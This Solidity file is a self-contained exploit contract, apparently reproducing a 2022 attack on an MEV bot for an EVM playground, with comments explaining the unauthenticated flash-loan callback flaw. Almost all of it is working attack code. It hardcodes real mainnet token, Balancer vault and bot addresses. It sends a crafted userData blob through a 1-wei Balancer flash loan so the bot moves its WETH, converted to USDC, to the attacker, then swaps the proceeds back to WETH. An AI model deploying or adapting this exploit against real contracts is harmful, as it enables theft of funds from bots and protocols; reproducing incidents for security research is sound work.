// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-MEVa47b).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry ContractTest (the
// flash-loan callback / swap stubs live on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack so the playground can deploy it and record run().
// Logic and the userData blob are copied verbatim from test/MEVa47b_exp.sol;
// only the payout-recipient word inside userData is rebuilt at runtime to
// address(this) (the original substituted the test's own address the same way).
//
// Root cause: the MEV bot's Balancer `receiveFlashLoan` callback executes an
// attacker-crafted instruction list (userData) without authenticating the
// flash-loan initiator. Anyone can start a 1-wei Balancer flash loan with the
// bot as recipient and userData that makes the bot transfer its own idle WETH
// to a module, swap it to USDC, and send the USDC to the attacker's address.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract MEVa47bExploit {
    IERC20 constant WETH_TOKEN = IERC20(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant MEV_BOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;
    IUniswapV2Pair constant WETH_USDC_PAIR_SUSHI = IUniswapV2Pair(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
    Uni_Router_V3 constant UNI_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;

        // Attacker-crafted instruction blob for the bot's receiveFlashLoan.
        // Verbatim from test/MEVa47b_exp.sol; only the payout-recipient word
        // (word 8 of the second block: 0x..3d539801af <address>) is rebuilt to
        // address(this) — exactly as the original substituted its own address.
        bytes memory userData = bytes.concat(
            abi.encode(
                uint256(0x0000000000000000000000000000000000000000000000000000000000000080),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000100),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000280),
                uint256(0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000003),
                uint256(uint160(address(WETH_TOKEN))),
                uint256(uint160(address(USDC_TOKEN))),
                uint256(uint160(address(WETH_TOKEN))),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000002),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000040),
                uint256(0x00000000000000000000000000000000000000000000000000000000000000c0)
            ),
            abi.encode(
                uint256(0x0000000000000000000000000000000000000000000000000000000000000060),
                uint256(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a),
                uint256(0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000),
                uint256(0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000064),
                uint256(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f),
                uint256(0x27ead9083c756cc2000000000000000000000000000000000000000000000000),
                // payout recipient = 0x3d539801af ++ address(this)
                uint256(uint256(0x3d539801af) << 160 | uint160(address(this))),
                uint256(0x26f2000000000000000000000000000000000000000000000000000000000000),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000002),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000008),
                uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
            )
        );

        // Trigger the bot's unauthenticated receiveFlashLoan; the bot ships its
        // own idle WETH out, swaps it to USDC, and delivers the USDC here.
        BALANCER_VAULT.flashLoan(MEV_BOT, tokens, amounts, userData);

        // Convert the received USDC back to WETH; profit stays in this contract.
        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _USDCToWETH();
    }

    // Callback stubs the bot's second module calls back into (leftover plumbing,
    // harmless no-ops — copied verbatim from the test).
    function getReserves() external view returns (uint112, uint112, uint32) {
        return WETH_USDC_PAIR_SUSHI.getReserves();
    }

    function swap(uint256, uint256, address, bytes calldata) external pure {}

    function _USDCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC_TOKEN),
            tokenOut: address(WETH_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UNI_ROUTER.exactInputSingle(_Params);
    }
}
